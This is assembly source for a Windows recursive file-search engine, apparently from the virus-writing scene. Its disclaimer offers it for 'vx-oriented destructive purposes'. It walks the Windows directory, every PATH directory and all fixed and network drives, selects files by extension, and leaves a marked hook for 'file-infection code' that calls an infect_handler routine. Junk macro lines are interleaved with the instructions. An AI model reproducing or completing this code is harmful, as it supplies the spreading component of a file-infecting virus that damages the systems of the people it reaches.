
; RECSERCH 1.50


;                                DESCRIPTION
;
; here is asm source of recursive file search & other shit you need so much ;)
;
; subroutines:
;
; � process_windir()            process directory %windir% & all subdirs
; � process_path()              process all directories/subdirs from %path%
; � process_drives()            recursive process each fixed drive
; �� process_directory()       process specified directory & all subdirs
;      �� process_file()       process specified file (dump filename)
;
; all subroutines are offset-independent, i.e. you may call'em with any
; displacement.
;
;                                 DISCLAIMER
;
; You're free you use these sources for any vx-oriented destructive purposes.
; No fuckin pacific or commercial usage available.
;
;                               Seek & Enjoy! X-)
;                                                      http://z0mbie.cjb.net


ff_struc                struc                   ; win32 "searchrec" structure
ff_attr                 dd      ?
ff_time_create          dd      ?,?
ff_time_lastaccess      dd      ?,?
ff_time_lastwrite       dd      ?,?
ff_size                 dd      ?,?
                        dd      ?,?
ff_fullname             db      260 dup (?)
ff_shortname            db      14 dup (?)
                        ends

; subroutine: process_windir
; action:     process md directory & all subdirs
;             1. get %windir%
;             2. call process_directory
; input:      EDI=ff_struc
; output:     none

process_windir          proc    pascal
                        local   windir:BYTE:1024
                        pusha
        hooy
                        lea     eax, windir
        hooy
                        push    eax
        hooy
                        push    1024
                        push    eax
        hooy
                        call    xxGetWindowsDirectoryA
        hooy
                        pop     edx
        hooy
                        call    process_directory
        hooy
                        popa
        hooy
                        ret
        hooy
                        endp
        hooy

; subroutine: process_path
; action:     process all dirs/subdirs from %path%
;             1. get %path%
;             2. parse %path% and call process_directory for each dirname
; input:      EDI=ff_struc
; output:     none

process_path            proc    pascal
                        local   path:BYTE:1024
        hooy
                        pusha
        hooy
                        lea     esi, path
        hooy
                        mov     dword ptr [esi], 'HTAP'
        hooy
                        mov     byte ptr [esi+4], 0
        hooy
                        mov     ebx, 1024-1
        hooy
                        push    ebx
        hooy
                        push    esi
        hooy
                        push    esi
        hooy
                        call    xxGetEnvironmentVariableA
        hooy
                        mov     byte ptr [esi+ebx], 0
        hooy
__cycle:
        hooy
                        mov     edx, esi
        hooy
__scan:
        hooy
                        lodsb
        hooy
                        or      al, al
        hooy
                        jz      __done
        hooy
                        cmp     al, ';'
        hooy
                        jne     __scan
        hooy
__done:                 sub     [esi-1], al
        hooy
                        call    process_directory
        hooy
                        or      al, al
        hooy
                        jnz     __cycle
        hooy
                        popa
        hooy
                        ret
        hooy
                        endp
        hooy

; subroutine: process_drives
; action:     for each drive (A:..Z:) with type DRIVE_FIXED||DRIVE_REMOTE
;             call subroutine process_directory passing drive's root as arg
; input:      EDI=ff_struc
; output:     none

        hooy
process_drives:         pusha
        hooy
                        push    '\:A'
        hooy
__cycle:                push    esp
        hooy
                        call    xxGetDriveTypeA
        hooy
                        sub     eax, 3        ; DRIVE_FIXED=3  DRIVE_REMOTE=4
        hooy
                        cmp     eax, 1
        hooy
                        ja      __next
        hooy
                        mov     edx, esp
        hooy
                        call    process_directory
        hooy
__next:                 inc     byte ptr [esp]
        hooy
                        cmp     byte ptr [esp], 'Z'
        hooy
                        jbe     __cycle
        hooy
                        pop     ecx
        hooy
                        popa

                        ret
        hooy
; subroutine: process_directory
; action:     1. set current directory to one specified by EDX
;             2. find all files in the current directory
;             3. for each found directory (except "."/"..") recursive call;
;                for each found file call process_file
;             4. set current directory to ".."
; input:      EDI=ff_struc
;             EDX=directory name (should be full path if 1st call)
; output:     none

        hooy
process_directory:      pusha
        hooy

        hooy
                        mov     ecx, 1024/4
        hooy
__pushit:               push    ecx
        hooy
                        loop    __pushit
        hooy

        hooy
                        mov     ebx, edi
        hooy
                        mov     esi, edx
        hooy
                        mov     edi, esp
        hooy
__1:                    lodsb
        hooy
                        stosb
        hooy
                        or      al, al
        hooy
                        jnz     __1
        hooy
                        dec     edi
        hooy
                        mov     al, '\'
        hooy
                        cmp     [edi-1], al
        hooy
                        je      __3
        hooy
                        stosb
        hooy
__3:                    mov     ebp, edi
        hooy
                        mov     eax, '*.*'
        hooy
                        stosd
        hooy
                        mov     edi, ebx
        hooy

        hooy
                        mov     eax, esp
        hooy
                        push    edi
        hooy
                        push    eax
        hooy
                        call    xxFindFirstFileA
        hooy
                        mov     esi, eax
        hooy
                        inc     eax
        hooy
                        jz      __exit
        hooy

__cycle:
        hooy

        hooy
                        pusha
        hooy
                        lea     esi, [edi].ff_fullname
        hooy
                        mov     edi, ebp
        hooy
__2:                    lodsb
        hooy
                        stosb
        hooy
                        or      al, al
        hooy
                        jnz     __2
        hooy
                        popa

        hooy
                        mov     edx, esp
        hooy

        hooy
                        test    byte ptr [edi].ff_attr, 16
        hooy
                        jnz     __dir

        hooy
                        call    process_file
        hooy

        hooy
                        jmp     __next

        hooy
__dir:                  lea     eax, [edi].ff_fullname
        hooy
                        cmp     byte ptr [eax], '.'
        hooy
                        je      __next
        hooy

        hooy
                        call    process_directory
        hooy

        hooy
__next:                 push    edi
        hooy
                        push    esi
        hooy
                        call    xxFindNextFileA
        hooy
                        or      eax, eax
        hooy
                        jnz     __cycle
        hooy

        hooy
__exit:                 push    esi
        hooy
                        call    xxFindClose
        hooy

        hooy
                        add     esp, 1024
        hooy

        hooy
                        popa
        hooy
                        ret
        hooy

; subroutine: process_file
; action:     handle each file found by process_directory
; input:      EDI=ff_struc
;             EDX=file name ([edi].ff_fullname)
; output:     none

        hooy
process_file:           pusha
        hooy

        hooy
; get file extension
        hooy
                        mov     edi, edx
        hooy
                        mov     ecx, 1024
        hooy
                        xor     eax, eax
        hooy
                        cld
        hooy
                        repnz   scasb
        hooy
                        mov     eax, [edi-5]
        hooy
                        or      eax, 20202000h
        hooy

; check extension
        hooy
                        cmp     eax, 'm0z.'
        hooy
                        jne     __exit
        hooy

; put your file-infection code here

        hooy
                        call    infect_handler

        hooy
__exit:                 popa
        hooy
                        ret
        hooy

